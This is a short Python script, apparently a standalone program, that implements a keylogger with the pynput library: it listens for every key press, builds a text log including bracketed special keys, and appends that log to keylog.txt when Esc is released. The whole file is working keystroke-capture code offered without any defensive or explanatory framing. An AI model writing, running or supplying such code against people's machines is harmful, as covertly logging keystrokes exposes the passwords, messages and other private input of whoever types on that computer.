import pynput.keyboard

class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.log += " "
            else:
                self.log += " [" + str(key) + "] "

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            self.write_log()
            return False

    def write_log(self):
        with open("keylog.txt", "a") as f:
            f.write(self.log)

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
